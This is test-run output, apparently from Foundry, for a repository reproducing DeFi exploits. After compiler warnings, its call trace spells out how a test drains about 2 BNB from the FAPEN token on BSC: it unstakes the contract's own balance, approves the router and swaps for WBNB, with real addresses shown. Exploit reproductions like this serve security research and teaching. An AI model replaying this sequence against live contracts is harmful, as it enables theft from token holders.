Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.15s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-05/FAPEN_exp.sol:22:5:
   |
22 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 349.04ms (123.57µs CPU time)

Ran 1 test for src/test/2023-05/FAPEN_exp.sol:ContractTest
[PASS] testUnstake() (gas: 148500)
Logs:
  Amount of BNB before attack: 0.000000000000000000
  Amount of BNB after attack: 2.042256597375684021

Traces:
  [190890] ContractTest::testUnstake()
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Amount of BNB before attack", val: 0, decimals: 18)
    ├─ [2864] FAPEN::balanceOf(FAPEN: [0xf3F1aBae8BfeCA054B330C379794A7bf84988228]) [staticcall]
    │   └─ ← [Return] 9521992386510669 [9.521e15]
    ├─ [26475] FAPEN::unstake(9521992386510669 [9.521e15])
    │   └─ ← [Stop] 
    ├─ [25149] FAPEN::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [864] FAPEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 9521992386510669 [9.521e15]
    ├─ [113651] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(9521992386510669 [9.521e15], 0, [0xf3F1aBae8BfeCA054B330C379794A7bf84988228, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1685373653 [1.685e9])
    │   ├─ [16223] FAPEN::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x1d1043D07B842c97a948E51c50470FDc7A02B9da, 9521992386510669 [9.521e15])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x1d1043D07B842c97a948E51c50470FDc7A02B9da, value: 9426772462645563 [9.426e15])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FAPEN: [0xf3F1aBae8BfeCA054B330C379794A7bf84988228], value: 95219923865106 [9.521e13])
    │   │   └─ ← [Return] true
    │   ├─ [2893] 0x1d1043D07B842c97a948E51c50470FDc7A02B9da::getReserves() [staticcall]
    │   │   └─ ← [Return] 5450932044005715904 [5.45e18], 15694636930535451 [1.569e16], 1685373266 [1.685e9]
    │   ├─ [864] FAPEN::balanceOf(0x1d1043D07B842c97a948E51c50470FDc7A02B9da) [staticcall]
    │   │   └─ ← [Return] 25121409393181014 [2.512e16]
    │   ├─ [67172] 0x1d1043D07B842c97a948E51c50470FDc7A02B9da::swap(2042256597375684021 [2.042e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   ├─ [29962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2042256597375684021 [2.042e18])
    │   │   │   ├─ emit Transfer(from: 0x1d1043D07B842c97a948E51c50470FDc7A02B9da, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 2042256597375684021 [2.042e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WBNB::balanceOf(0x1d1043D07B842c97a948E51c50470FDc7A02B9da) [staticcall]
    │   │   │   └─ ← [Return] 3408675446630031883 [3.408e18]
    │   │   ├─ [864] FAPEN::balanceOf(0x1d1043D07B842c97a948E51c50470FDc7A02B9da) [staticcall]
    │   │   │   └─ ← [Return] 25121409393181014 [2.512e16]
    │   │   ├─ emit Sync(reserve0: 3408675446630031883 [3.408e18], reserve1: 25121409393181014 [2.512e16])
    │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 9426772462645563 [9.426e15], amount0Out: 2042256597375684021 [2.042e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   └─ ← [Stop] 
    │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   └─ ← [Return] 2042256597375684021 [2.042e18]
    │   ├─ [9223] WBNB::withdraw(2042256597375684021 [2.042e18])
    │   │   ├─ [83] Router::fallback{value: 2042256597375684021}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2042256597375684021 [2.042e18])
    │   │   └─ ← [Stop] 
    │   ├─ [55] ContractTest::receive{value: 2042256597375684021}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "Amount of BNB after attack", val: 2042256597375684021 [2.042e18], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 419.41ms (4.15ms CPU time)

Ran 2 test suites in 422.99ms (768.45ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
